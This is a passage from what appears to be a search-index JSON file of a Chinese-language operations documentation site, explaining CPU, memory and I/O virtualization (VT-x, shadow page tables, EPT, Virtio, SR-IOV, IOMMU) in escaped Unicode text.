<li>\u200b\u4e2d\u65ad\u200b\u5904\u7406\u200b\uff1a\u200b\u91c7\u7528\u200b\u4e00\u4e2a\u200b\u5f02\u6b65\u200b\u4e8b\u4ef6\u200b\u901a\u77e5\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u79f0\u4e3a\u200b Event Channel\uff0c\u200b\u4f5c\u4e3a\u200b\u5bf9\u200b\u786c\u4ef6\u200b\u4e2d\u65ad\u200b\u7684\u200b\u865a\u62df\u5316\u200b</li> </ul> <p>\u200b\u5230\u200b\u4e86\u200b 2006 \u200b\u5e74\u200b\u524d\u540e\u200b\uff0cIntel \u200b\u4e0e\u200b AMD \u200b\u5148\u540e\u200b\u53d1\u5e03\u200b\u4e86\u200b VT-x \u200b\u548c\u200b AMD-V \u200b\u6307\u4ee4\u96c6\u200b\u6269\u5c55\u200b\uff0c\u200b\u4ece\u200b\u786c\u4ef6\u200b\u5c42\u9762\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u5bf9\u200b\u865a\u62df\u5316\u200b\u7684\u200b\u652f\u6301\u200b\u3002\u200b\u4ee5\u200b VT-x \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u5176\u200b\u5f15\u5165\u200b\u4e86\u200b\u4e24\u4e2a\u200b\u65b0\u200b\u7684\u200b CPU \u200b\u8fd0\u884c\u200b\u6a21\u5f0f\u200b\uff08VMX root/non-root operation\uff09\uff0c\u200b\u5206\u522b\u200b\u4ea4\u7531\u200b Hypervisor \u200b\u548c\u200b Guest OS \u200b\u4f7f\u7528\u200b\uff0c\u200b\u5e76\u200b\u4ece\u200b\u786c\u4ef6\u200b\u5c42\u9762\u200b\u5b9e\u73b0\u200b\u6743\u9650\u200b\u63a7\u5236\u200b\u3002</p>"},{"location":"ops/virtualization/intro/#_5","title":"\u5185\u5b58\u200b\u865a\u62df\u5316","text":"<p>\u200b\u5bf9\u4e8e\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5185\u6838\u200b\u6765\u8bf4\u200b\uff0c\u200b\u5185\u5b58\u200b\u8d44\u6e90\u200b\u7684\u200b\u9ad8\u6548\u200b\u8c03\u5ea6\u200b\u5efa\u7acb\u200b\u5728\u200b\u5bf9\u200b\u7269\u7406\u200b\u5185\u5b58\u5730\u5740\u200b\u7a7a\u95f4\u200b\u7684\u200b\u4e24\u4e2a\u200b\u5047\u8bbe\u200b\u4e0a\u200b\uff1a\u200b\u4ece\u96f6\u5f00\u59cb\u200b\u3001\u200b\u5185\u5b58\u5730\u5740\u200b\u8fde\u7eed\u200b\uff1b\u200b\u800c\u200b\u5bf9\u4e8e\u200b\u9700\u8981\u200b\u540c\u65f6\u200b\u8fd0\u884c\u200b\u591a\u4e2a\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u7684\u200b Hypervisor \u200b\u6765\u8bf4\u200b\uff0c\u200b\u9700\u8981\u200b\u9ad8\u6548\u200b\u5730\u200b\u8c03\u5ea6\u200b\u5185\u5b58\u200b\u8d44\u6e90\u200b\uff0c\u200b\u5c3d\u53ef\u80fd\u200b\u6ee1\u8db3\u200b\u6bcf\u4e2a\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5bf9\u200b\u5185\u5b58\u200b\u7684\u200b\u9700\u6c42\u200b\u3002</p> <p>\u200b\u76ee\u524d\u200b\uff0c\u200b\u4e3b\u6d41\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4f7f\u7528\u200b\u9875\u200b\uff08Page\uff09\u200b\u4e3a\u200b\u5355\u4f4d\u200b\u6765\u200b\u7ba1\u7406\u200b\u5185\u5b58\u200b\u3002\u200b\u5728\u200b\u975e\u200b\u865a\u62df\u5316\u200b\u7684\u200b\u73af\u5883\u200b\u4e0b\u200b\uff0c\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4f7f\u7528\u200b\u9875\u8868\u200b\u5c06\u200b\u865a\u62df\u5185\u5b58\u200b\u5730\u5740\u200b\u8f6c\u6362\u200b\u5230\u200b\u7269\u7406\u200b\u5185\u5b58\u5730\u5740\u200b\uff0c\u200b\u7528\u4e8e\u200b\u8f85\u52a9\u200b\u5b8c\u6210\u200b\u8fd9\u4e00\u200b\u8f6c\u6362\u200b\u7684\u200b\u786c\u4ef6\u200b\u88ab\u200b\u79f0\u4e3a\u200b\u5185\u5b58\u200b\u7ba1\u7406\u200b\u5355\u5143\u200b\uff08Memory Management Unit\uff0cMMU\uff09\u3002\u200b\u4e3b\u6d41\u200b x86 \u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u7684\u200b\u865a\u62df\u5185\u5b58\u200b\u7ba1\u7406\u200b\u529f\u80fd\u200b\u90fd\u200b\u76f8\u5f53\u7a0b\u5ea6\u200b\u5730\u200b\u4f9d\u8d56\u4e8e\u200b MMU\uff0c\u200b\u56e0\u6b64\u200b\uff0c\u200b\u5728\u200b\u865a\u62df\u5316\u200b\u73af\u5883\u200b\u4e0b\u200b\uff0cHypervisor \u200b\u9700\u8981\u200b\u5b9e\u73b0\u200b MMU \u200b\u865a\u62df\u5316\u200b\u3002</p> <p>\u200b\u76ee\u524d\u200b\u8f6f\u4ef6\u200b\u5b9e\u73b0\u200b\u7684\u200b\u5185\u5b58\u200b\u865a\u62df\u5316\u200b\uff0c\u200b\u4e3b\u8981\u200b\u5206\u4e3a\u200b\u4ee5\u4e0b\u200b\u4e24\u79cd\u200b\uff1a</p> <ul> <li> <p>\u200b\u5b8c\u5168\u200b\u865a\u62df\u5316\u200b\uff1aShadow page table\uff08\u200b\u5f71\u5b50\u200b\u9875\u8868\u200b\uff09</p> <ul> <li>Hypervisor \u200b\u4e3a\u200b\u6bcf\u4e2a\u200b VM \u200b\u90fd\u200b\u7ef4\u62a4\u200b\u4e00\u5f20\u200b\u5f71\u5b50\u200b\u9875\u8868\u200b\uff0c\u200b\u5c06\u200b Guest OS \u200b\u4e2d\u200b\u7684\u200b\u865a\u62df\u5730\u5740\u200b\u7ffb\u8bd1\u200b\u4e3a\u200b Host \u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b</li> <li>\u200b\u6027\u80fd\u200b\u5f00\u9500\u200b\u5927\u200b</li> </ul> </li> <li> <p>\u200b\u534a\u200b\u865a\u62df\u5316\u200b\uff1a\u200b\u4ee5\u200b Xen \u200b\u6700\u521d\u200b\u7684\u200b\u5b9e\u73b0\u200b \u200b\u4e3a\u4f8b\u200b</p> <ul> <li>Guest \u200b\u548c\u200b Hypervisor \u200b\u5171\u4eab\u200b\u4e00\u5f20\u200b\u9875\u8868\u200b\uff0c\u200b\u4f46\u200b Guest \u200b\u7684\u200b\u5185\u5b58\u200b\u8bbf\u95ee\u200b\u8bf7\u6c42\u200b\u90fd\u200b\u8981\u200b\u7ecf\u8fc7\u200b Hypervisor \u200b\u7684\u200b\u5ba1\u8ba1\u200b\uff0cHypervisor \u200b\u901a\u8fc7\u200b\u4f7f\u7528\u200b\u989d\u5916\u200b\u7684\u200b\u5185\u5b58\u200b\u7ba1\u7406\u673a\u5236\u200b\uff08\u200b\u5982\u200b\u5185\u5b58\u200b\u5206\u6bb5\u200b\u3001\u200b\u989d\u5916\u200b\u7684\u200b\u6743\u9650\u200b\u8bbe\u7f6e\u200b\u7b49\u200b\uff09\u200b\u6765\u200b\u786e\u4fdd\u200b Guest \u200b\u7684\u200b\u5185\u5b58\u200b\u8bbf\u95ee\u200b\u5408\u6cd5\u200b</li> <li>\u200b\u6548\u7387\u200b\u8f83\u200b\u9ad8\u200b\uff0c\u200b\u4f46\u200b\u9700\u8981\u200b\u901a\u8fc7\u200b\u4fee\u6539\u200b Guest OS \u200b\u7684\u200b\u5185\u5b58\u200b\u7ba1\u7406\u200b\u6a21\u5757\u200b\u6765\u200b\u5b9e\u73b0\u200b</li> </ul> </li> </ul> <p>\u200b\u800c\u200b\u5185\u5b58\u200b\u865a\u62df\u5316\u200b\u7684\u200b\u786c\u4ef6\u200b\u8f85\u52a9\u200b\u6280\u672f\u200b\uff0c\u200b\u88ab\u200b\u79f0\u4e3a\u200b\u4e8c\u7ea7\u200b\u5730\u5740\u200b\u8f6c\u6362\u200b\u6280\u672f\u200b\uff08Second Level Address Translation\uff0cSLAT\uff09\uff0c\u200b\u901a\u8fc7\u200b\u6269\u5c55\u200b\u9875\u8868\u200b\u7ed3\u6784\u200b\uff0c\u200b\u5728\u200b\u786c\u4ef6\u200b\u4e0a\u200b\u76f4\u63a5\u200b\u652f\u6301\u200b Guest Virtual Address -&gt; Guest Physical Address -&gt; Host Physical Address \u200b\u8fd9\u200b\u4e24\u5c42\u200b\u5730\u5740\u200b\u8f6c\u6362\u200b\uff0c\u200b\u5982\u200b Intel \u200b\u7684\u200b Extended Page Table\uff08EPT\uff09\u200b\u548c\u200b AMD \u200b\u7684\u200b Rapid Virtualization Indexing (RVI) \u200b\u6280\u672f\u200b\u3002</p>"},{"location":"ops/virtualization/intro/#io","title":"I/O \u200b\u865a\u62df\u5316","text":"<p>\u200b\u5728\u200b\u975e\u200b\u865a\u62df\u5316\u200b\u7684\u200b\u73af\u5883\u200b\u4e0b\u200b\uff0c\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5185\u6838\u200b\u901a\u8fc7\u200b\u9a71\u52a8\u200b\u4e0e\u200b I/O \u200b\u8bbe\u5907\u200b\u8fdb\u884c\u200b\u4ea4\u4e92\u200b\u3002\u200b\u4ece\u200b CPU \u200b\u7684\u200b\u89d2\u5ea6\u770b\u200b\uff0c\u200b\u4e0e\u200b\u8bbe\u5907\u200b\u7684\u200b\u4ea4\u4e92\u65b9\u5f0f\u200b\u4e00\u822c\u200b\u5206\u4e3a\u200b\u4ee5\u4e0b\u200b\u4e09\u79cd\u200b\uff1a</p> <ul> <li>\u200b\u4e2d\u65ad\u200b\uff1a\u200b\u5f53\u200b\u8bbe\u5907\u200b\u53d1\u751f\u200b\u7279\u5b9a\u200b I/O \u200b\u4e8b\u4ef6\u200b\u65f6\u200b\uff0c\u200b\u901a\u8fc7\u200b\u4e2d\u65ad\u200b\u4fe1\u53f7\u200b\u901a\u77e5\u200b CPU\uff0c\u200b\u4fc3\u4f7f\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u53ca\u65f6\u200b\u54cd\u5e94\u200b\u5904\u7406\u200b</li> <li>\u200b\u5bc4\u5b58\u5668\u200b\u8bbf\u95ee\u200b\uff1aCPU \u200b\u901a\u8fc7\u200b\u8bfb\u5199\u200b\u8bbe\u5907\u200b\u5bc4\u5b58\u5668\u200b\u6765\u200b\u63a7\u5236\u200b\u8bbe\u5907\u200b\u72b6\u6001\u200b\u6216\u200b\u83b7\u53d6\u200b\u8bbe\u5907\u200b\u6570\u636e\u200b</li> <li>DMA\uff1a\u200b\u8bbe\u5907\u200b\u76f4\u63a5\u200b\u4e0e\u200b\u5185\u5b58\u200b\u8fdb\u884c\u200b\u6570\u636e\u4ea4\u6362\u200b\uff0c\u200b\u65e0\u9700\u200b CPU \u200b\u4ecb\u5165\u200b\u63a7\u5236\u200b</li> </ul> <p>\u200b\u800c\u200b\u5728\u200b\u865a\u62df\u5316\u200b\u67b6\u6784\u200b\u4e2d\u200b\uff0cGuest OS \u200b\u4e0e\u200b\u7269\u7406\u200b I/O \u200b\u8bbe\u5907\u200b\u4e4b\u95f4\u200b\u591a\u51fa\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u865a\u62df\u5316\u200b\u5c42\u200b\uff0c\u200b\u5b83\u4eec\u200b\u4e4b\u95f4\u200b\u7684\u200b\u4ea4\u4e92\u200b\u5fc5\u987b\u200b\u7531\u200b\u865a\u62df\u5316\u200b\u5c42\u200b\u59a5\u5584\u5904\u7406\u200b\u3002\u200b\u4e3a\u6b64\u200b\uff0cI/O \u200b\u865a\u62df\u5316\u200b\u9700\u8981\u200b\uff1a</p> <ul> <li>\u200b\u5411\u200b Guest OS \u200b\u63d0\u4f9b\u200b\u8bbe\u5907\u200b\u63a5\u53e3\u200b</li> <li>\u200b\u622a\u83b7\u200b\u5e76\u200b\u5904\u7406\u200b Guest OS \u200b\u5411\u200b\u8bbe\u5907\u200b\u53d1\u8d77\u200b\u7684\u200b\u8bbf\u95ee\u200b\u64cd\u4f5c\u200b</li> </ul> <p>\u200b\u4ee5\u4e0b\u200b\u5c06\u200b\u8ba8\u8bba\u200b\u51e0\u7c7b\u200b\u4e3b\u6d41\u200b\u7684\u200b I/O \u200b\u865a\u62df\u5316\u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u5f0f\u200b\u3002</p>"},{"location":"ops/virtualization/intro/#_6","title":"\u8bbe\u5907\u200b\u4eff\u771f","text":"<p>\u200b\u5bf9\u4e8e\u200b\u4e00\u4e9b\u200b\u5b9e\u73b0\u200b\u7b80\u5355\u200b\uff0c\u200b\u4e14\u200b\u6027\u80fd\u200b\u8981\u6c42\u200b\u4e0d\u9ad8\u200b\u7684\u200b I/O \u200b\u8bbe\u5907\u200b\uff08\u200b\u5982\u200b\u952e\u76d8\u200b\u3001\u200b\u9f20\u6807\u200b\u3001\u200b\u7b80\u5355\u200b\u7f51\u5361\u200b\u7b49\u200b\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u91c7\u7528\u200b\u7eaf\u200b\u8f6f\u4ef6\u200b\u65b9\u5f0f\u200b\u6765\u200b\u5b8c\u5168\u200b\u6a21\u62df\u200b\u5df2\u6709\u200b\u7269\u7406\u200b\u786c\u4ef6\u200b\u7684\u200b\u884c\u4e3a\u200b\u3002</p> <p>\u200b\u6b64\u65f6\u200b\uff0cGuest OS \u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u73b0\u6709\u200b\u7684\u200b\u3001\u200b\u4e3a\u200b\u7269\u7406\u200b\u786c\u4ef6\u200b\u5b9e\u73b0\u200b\u7684\u200b\u9a71\u52a8\u200b\u6765\u200b\u64cd\u4f5c\u200b\u8bbe\u5907\u200b\uff0c\u200b\u4f46\u200b\u5bf9\u4e8e\u200b I/O \u200b\u541e\u5410\u91cf\u200b\u8f83\u5927\u200b\u7684\u200b\u8bbe\u5907\u200b\u6765\u8bf4\u200b\uff0c\u200b\u7eaf\u200b\u8f6f\u4ef6\u200b\u5b9e\u73b0\u200b\u53ef\u80fd\u200b\u5e26\u6765\u200b\u65e0\u6cd5\u200b\u5ffd\u7565\u200b\u7684\u200b\u6027\u80fd\u200b\u5f00\u9500\u200b\u3002</p>"},{"location":"ops/virtualization/intro/#_7","title":"\u534a\u200b\u865a\u62df\u5316","text":"<p>\u200b\u5728\u200b\u8fd9\u79cd\u200b\u67b6\u6784\u200b\u4e2d\u200b\uff0cGuest OS \u200b\u901a\u8fc7\u200b\u5728\u200b I/O \u200b\u5b50\u7cfb\u7edf\u200b\u4e0a\u200b\u52a0\u4ee5\u200b\u4fee\u6539\u200b\uff0c\u200b\u80fd\u591f\u200b\u611f\u77e5\u200b\u5230\u200b\u81ea\u5df1\u200b\u8fd0\u884c\u200b\u5728\u200b\u865a\u62df\u5316\u200b\u73af\u5883\u200b\u4e2d\u200b\uff0c\u200b\u5e76\u200b\u4e0e\u200b Hypervisor \u200b\u534f\u540c\u5de5\u4f5c\u200b\u3002</p> <p>\u200b\u4ee5\u200b Xen \u200b\u4f7f\u7528\u200b\u7684\u200b\u300c\u200b\u5206\u79bb\u200b\u9a71\u52a8\u200b\u300d\u200b\u67b6\u6784\u200b\u4e3a\u4f8b\u200b\u3002\u200b\u5728\u200b\u8fd9\u79cd\u200b\u67b6\u6784\u200b\u4e2d\u200b\uff0c\u200b\u9a71\u52a8\u200b\u88ab\u200b\u5206\u4e3a\u200b\u4e24\u4e2a\u200b\u90e8\u5206\u200b\uff1a\u200b\u8fd0\u884c\u200b\u5728\u200b Guest OS \u200b\u4e0a\u200b\u7684\u200b\u524d\u7aef\u200b\u9a71\u52a8\u200b\uff08front-end driver\uff09\u200b\u548c\u200b\u8fd0\u884c\u200b\u5728\u200b Hypervisor \u200b\u4e0a\u200b\u7684\u200b\u540e\u200b\u7aef\u200b\u9a71\u52a8\u200b\uff08back-end driver\uff09\u3002\u200b\u524d\u7aef\u200b\u9a71\u52a8\u200b\u5411\u200b Guest OS \u200b\u63d0\u4f9b\u200b\u51e0\u7c7b\u200b\u6807\u51c6\u200b\u7684\u200b\u8bbe\u5907\u200b\u63a5\u53e3\u200b\uff0c\u200b\u800c\u540e\u200b\u7aef\u200b\u9a71\u52a8\u200b\u5219\u200b\u8d1f\u8d23\u200b\u64cd\u4f5c\u200b\u5b9e\u9645\u200b\u7269\u7406\u200b\u786c\u4ef6\u200b\uff0c\u200b\u524d\u540e\u200b\u7aef\u200b\u9a71\u52a8\u200b\u4e4b\u95f4\u200b\u901a\u8fc7\u200b\u5171\u4eab\u5185\u5b58\u200b\uff0c\u200b\u4f7f\u7528\u200b\u4e00\u4e2a\u200b\u88ab\u200b\u79f0\u4e3a\u200b I/O ring \u200b\u7684\u200b\u6570\u636e\u7ed3\u6784\u200b\u6765\u200b\u5b9e\u73b0\u200b\u5f02\u6b65\u200b\u6570\u636e\u4ea4\u6362\u200b\u3002</p> <p>\u200b\u8fd9\u79cd\u200b\u5b9e\u73b0\u200b\u907f\u514d\u200b\u4e86\u200b\u8bbe\u5907\u200b\u4eff\u771f\u200b\u4e2d\u200b\u786c\u4ef6\u200b\u6a21\u62df\u200b\u5f00\u9500\u200b\u8f83\u5927\u200b\u7b49\u200b\u95ee\u9898\u200b\uff0cGuest OS \u200b\u901a\u8fc7\u200b\u91c7\u7528\u200b\u7ecf\u8fc7\u200b\u6027\u80fd\u200b\u4f18\u5316\u200b\u7684\u200b\u901a\u4fe1\u63a5\u53e3\u200b\u4e0e\u200b Hypervisor \u200b\u534f\u540c\u5de5\u4f5c\u200b\uff0c\u200b\u5728\u200b I/O \u200b\u6027\u80fd\u200b\u4e0a\u200b\u4f18\u4e8e\u200b\u5b8c\u5168\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u4eff\u771f\u200b\u3002</p> <p>Virtio</p> <p>Virtio \u200b\u662f\u200b\u4e00\u5957\u200b I/O \u200b\u534a\u200b\u865a\u62df\u5316\u200b\u5f00\u653e\u200b\u6807\u51c6\u200b\uff0c\u200b\u5176\u200b\u540c\u6837\u200b\u91c7\u7528\u200b\u5206\u79bb\u200b\u9a71\u52a8\u200b\u7684\u200b\u67b6\u6784\u200b\uff0c\u200b\u65e8\u5728\u200b\u89c4\u8303\u200b\u5404\u7c7b\u200b I/O \u200b\u8bbe\u5907\u200b\uff08\u200b\u5982\u200b\u7f51\u7edc\u200b\u3001\u200b\u5b58\u50a8\u8bbe\u5907\u200b\u7b49\u200b\uff09\u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b\u548c\u200b\u4e8b\u4ef6\u5904\u7406\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u63d0\u5347\u200b\u865a\u62df\u5316\u200b\u73af\u5883\u200b\u7684\u200b\u6548\u7387\u200b\u548c\u200b\u517c\u5bb9\u6027\u200b\u3002</p> <p>Virtio \u200b\u7684\u200b\u57fa\u672c\u200b\u67b6\u6784\u200b\u5982\u4e0b\u200b\u56fe\u200b\u6240\u793a\u200b\uff0c\u200b\u8be6\u7ec6\u200b\u6807\u51c6\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b spec\u3002</p> <p></p> <p>\u200b\u5982\u4e0b\u200b\u56fe\u4e2d\u200b\u7684\u200b virt-manager \u200b\u754c\u9762\u200b\uff0c\u200b\u7f51\u5361\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b\u4f7f\u7528\u200b Virtio \u200b\u8bbe\u5907\u200b\u6a21\u578b\u200b\uff1a</p> <p></p>"},{"location":"ops/virtualization/intro/#_8","title":"\u8bbe\u5907\u200b\u76f4\u901a","text":"<p>\u200b\u5728\u200b\u8bbe\u5907\u200b\u76f4\u901a\u200b\u6280\u672f\u200b\u4e2d\u200b\uff0cHypervisor \u200b\u5c06\u200b\u7269\u7406\u200b I/O \u200b\u8bbe\u5907\u200b\u76f4\u63a5\u200b\u5206\u914d\u200b\u7ed9\u200b\u7279\u5b9a\u200b\u7684\u200b\u865a\u62df\u673a\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u8be5\u200b\u865a\u62df\u673a\u200b\u80fd\u591f\u200b\u76f4\u63a5\u200b\u4e0e\u200b\u786c\u4ef6\u200b\u8fdb\u884c\u200b\u4ea4\u4e92\u200b\uff0c\u200b\u800c\u200b\u65e0\u9700\u200b\u7ecf\u8fc7\u200b\u4e2d\u95f4\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u4eff\u771f\u200b\u6216\u200b\u5206\u79bb\u200b\u9a71\u52a8\u200b\u5c42\u200b\u3002\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u53ef\u80fd\u200b\u4f9d\u8d56\u4e8e\u200b\u786c\u4ef6\u200b\u652f\u6301\u200b\uff08\u200b\u4f8b\u5982\u200b Intel VT-d \u200b\u6216\u200b AMD IOMMU\uff09\u200b\u6765\u200b\u5b9e\u73b0\u200b DMA \u200b\u91cd\u200b\u6620\u5c04\u200b\u548c\u200b\u4e2d\u65ad\u200b\u9694\u79bb\u200b\u7b49\u200b\u529f\u80fd\u200b\u3002</p> <p>\u200b\u8bbe\u5907\u200b\u76f4\u901a\u200b\u7684\u200b\u6027\u80fd\u200b\u662f\u200b\u6700\u597d\u200b\u7684\u200b\uff0c\u200b\u51e0\u4e4e\u200b\u80fd\u591f\u200b\u83b7\u5f97\u200b\u539f\u751f\u200b\u7684\u200b I/O \u200b\u6027\u80fd\u200b\uff0c\u200b\u4f46\u200b\u72ec\u5360\u200b\u8bbe\u5907\u200b\u4f7f\u5f97\u200b\u5176\u200b\u7075\u6d3b\u6027\u200b\u7a0d\u5dee\u200b\uff0c\u200b\u5728\u200b\u914d\u7f6e\u200b\u4e0a\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u7565\u5fae\u200b\u590d\u6742\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5b58\u5728\u200b\u517c\u5bb9\u6027\u95ee\u9898\u200b\u3002</p> <p>Single-Root Input/Output Virtualization (SR-IOV)</p> <p>SR-IOV\uff08\u200b\u5355\u6839\u200b I/O \u200b\u865a\u62df\u5316\u200b\uff09\u200b\u662f\u200b\u4e00\u79cd\u200b\u786c\u4ef6\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\uff0c\u200b\u5b83\u200b\u5141\u8bb8\u200b\u5355\u4e2a\u200b\u7269\u7406\u200b PCIe \u200b\u8bbe\u5907\u200b\u5212\u5206\u200b\u51fa\u200b\u591a\u4e2a\u200b\u72ec\u7acb\u200b\u7684\u200b\u865a\u62df\u200b\u8bbe\u5907\u200b\u3002\u200b\u5177\u4f53\u6765\u8bf4\u200b\uff0cSR-IOV \u200b\u5c06\u200b\u7269\u7406\u200b\u8bbe\u5907\u200b\u5206\u4e3a\u200b\u4e24\u7c7b\u200b\uff1a  </p> <ul> <li>\u200b\u7269\u7406\u200b\u529f\u80fd\u200b\uff08PF\uff09\uff1a\u200b\u7531\u200b\u7ba1\u7406\u7a0b\u5e8f\u200b\u4f7f\u7528\u200b\uff0c\u200b\u8d1f\u8d23\u200b\u8bbe\u5907\u200b\u7684\u200b\u914d\u7f6e\u200b\u548c\u200b\u5206\u914d\u8d44\u6e90\u200b\u3002  </li> <li>\u200b\u865a\u62df\u200b\u529f\u80fd\u200b\uff08VF\uff09\uff1a\u200b\u4f9b\u200b\u865a\u62df\u673a\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\uff0c\u200b\u51e0\u4e4e\u200b\u62e5\u6709\u200b\u4e0e\u200b\u7269\u7406\u200b\u8bbe\u5907\u200b\u76f8\u540c\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u4f46\u200b\u8d44\u6e90\u200b\u53d7\u9650\u200b\u3002  </li> </ul> <p>\u200b\u8fd9\u79cd\u200b\u5206\u79bb\u200b\u4f7f\u5f97\u200b\u865a\u62df\u673a\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b VF\uff0c\u200b\u4ece\u800c\u200b\u7ed5\u8fc7\u200b\u5927\u90e8\u5206\u200b hypervisor \u200b\u5c42\u200b\u7684\u200b\u5e72\u9884\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u63a5\u8fd1\u200b\u88f8\u673a\u200b\u7684\u200b I/O \u200b\u6027\u80fd\u200b\uff0c\u200b\u540c\u65f6\u200b\u964d\u4f4e\u200b\u4e86\u200b\u865a\u62df\u5316\u200b\u5f00\u9500\u200b\u3002SR-IOV \u200b\u6280\u672f\u200b\u5728\u200b\u9ad8\u6027\u80fd\u200b\u7f51\u7edc\u200b\u3001\u200b\u5b58\u50a8\u200b\u7b49\u200b\u9886\u57df\u200b\u5e94\u7528\u200b\u5e7f\u6cdb\u200b\uff0c\u200b\u7279\u522b\u200b\u9002\u7528\u200b\u4e8e\u200b\u6570\u636e\u4e2d\u5fc3\u200b\u548c\u200b\u4e91\u200b\u8ba1\u7b97\u73af\u5883\u200b\u3002</p> <p>IOMMU</p> <p>IOMMU\uff08\u200b\u8f93\u5165\u200b/\u200b\u8f93\u51fa\u200b\u5185\u5b58\u200b\u7ba1\u7406\u200b\u5355\u5143\u200b\uff09\u200b\u662f\u200b\u4e00\u79cd\u200b\u786c\u4ef6\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\uff0c\u200b\u65e8\u5728\u200b\u4e3a\u200b\u8bbe\u5907\u200b\u7684\u200b\u76f4\u63a5\u200b\u5185\u5b58\u200b\u8bbf\u95ee\u200b\uff08DMA\uff09\u200b\u63d0\u4f9b\u200b\u5730\u5740\u200b\u8f6c\u6362\u200b\u548c\u200b\u5185\u5b58\u4fdd\u62a4\u200b\u3002\u200b\u5b83\u200b\u901a\u8fc7\u200b\u5c06\u200b\u8bbe\u5907\u200b\u8bf7\u6c42\u200b\u4e2d\u200b\u7684\u200b\u865a\u62df\u200b\u5730\u5740\u6620\u5c04\u200b\u5230\u200b\u5b9e\u9645\u200b\u7269\u7406\u200b\u5185\u5b58\u5730\u5740\u200b\uff0c\u200b\u540c\u65f6\u200b\u5bf9\u200b\u8bbe\u5907\u200b\u8bbf\u95ee\u200b\u8fdb\u884c\u200b\u6743\u9650\u200b\u68c0\u67e5\u200b\uff0c\u200b\u4ece\u800c\u200b\u5b9e\u73b0\u200b\uff1a</p> <ul> <li>\u200b\u5185\u5b58\u200b\u9694\u79bb\u200b\uff1a\u200b\u9632\u6b62\u200b\u8bbe\u5907\u200b\u8d8a\u754c\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u786e\u4fdd\u200b\u4e0d\u540c\u200b\u865a\u62df\u673a\u200b\u6216\u200b\u7cfb\u7edf\u200b\u7ec4\u4ef6\u200b\u95f4\u200b\u7684\u200b\u5185\u5b58\u200b\u5b89\u5168\u200b\u9694\u79bb\u200b\u3002</li> <li>DMA \u200b\u91cd\u200b\u6620\u5c04\u200b\uff1a\u200b\u5141\u8bb8\u200b\u865a\u62df\u673a\u200b\u62e5\u6709\u200b\u72ec\u7acb\u200b\u7684\u200b DMA \u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u63d0\u9ad8\u200b\u865a\u62df\u5316\u200b\u73af\u5883\u200b\u4e2d\u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b\u6548\u7387\u200b\u548c\u200b\u5b89\u5168\u6027\u200b\u3002</li> <li>\u200b\u589e\u5f3a\u200b\u7cfb\u7edf\u200b\u7a33\u5b9a\u6027\u200b\u4e0e\u200b\u5b89\u5168\u6027\u200b\uff1a\u200b\u6709\u6548\u200b\u963b\u6b62\u200b\u6076\u610f\u200b\u6216\u200b\u9519\u8bef\u200b\u8bbe\u5907\u200b\u5bf9\u200b\u5185\u5b58\u200b\u7684\u200b\u76f4\u63a5\u200b\u5e72\u6270\u200b\uff0c\u200b\u964d\u4f4e\u200b\u7cfb\u7edf\u200b\u98ce\u9669\u200b\u3002</li> </ul> <p>\u200b\u8fd9\u79cd\u200b\u673a\u5236\u200b\u7279\u522b\u200b\u9002\u7528\u200b\u4e8e\u200b\u865a\u62df\u5316\u200b\u548c\u200b\u9ad8\u6027\u80fd\u200b\u8ba1\u7b97\u73af\u5883\u200b\uff0c\u200b\u5728\u200b\u4fdd\u62a4\u200b\u7cfb\u7edf\u200b\u5185\u5b58\u200b\u5b89\u5168\u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u786e\u4fdd\u200b\u4e86\u200b\u8bbe\u5907\u200b\u9ad8\u6548\u200b\u3001\u200b\u53ef\u9760\u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b\u3002</p>"},{"location":"ops/virtualization/intro/#_9","title":"\u64cd\u4f5c\u7cfb\u7edf\u200b\u5c42\u200b\u865a\u62df\u5316","text":"<p>\u200b\u5728\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u7ea7\u200b\u865a\u62df\u5316\u200b\uff08OS-level 